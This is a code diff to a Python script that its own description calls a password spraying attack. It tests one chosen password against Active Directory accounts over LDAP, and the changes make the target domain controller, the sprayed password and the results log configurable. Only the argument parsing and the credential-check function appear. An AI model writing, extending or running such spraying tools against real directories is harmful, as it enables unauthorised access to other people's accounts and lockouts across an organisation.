@@ -8,6 +8,12 @@ import argparse
 import ldap
 
 #accept arguments
+# parse arguments
+ap = argparse.ArgumentParser(description='This is a password spraying attack') 
+ap.add_argument('dc', type=str, help='domain controller', default=None)
+ap.add_argument('--password', '-p', type=str, help='password to spray', default='password')
+ap.add_argument('--log', '-l',  help='write results to LOG', default='passSpray.txt')
+args = ap.parse_args()
 
 #establish logging
 
@@ -25,13 +31,13 @@ def check_credentials(username, password):
    Returns None on success or a string describing the error on failure
    # Adapt to your needs
    """
-   LDAP_SERVER = 'ldap://ars.dc'
+   LDAP_SERVER = 'ldap://%s' % args.dc
    # fully qualified AD user name
-   LDAP_USERNAME = '%s@xxx.xx' % username
+   LDAP_USERNAME = '%s@%s' % (username, args.dc)
    # your password
-   LDAP_PASSWORD = password
+   LDAP_PASSWORD = args.password
    base_dn = 'DC=xxx,DC=xxx'
-   ldap_filter = 'userPrincipalName=%s@xxx.xx' % username
+   ldap_filter = 'userPrincipalName=%s@%s' % (username, args.dc)
    attrs = ['memberOf']
    try:
        # build a client
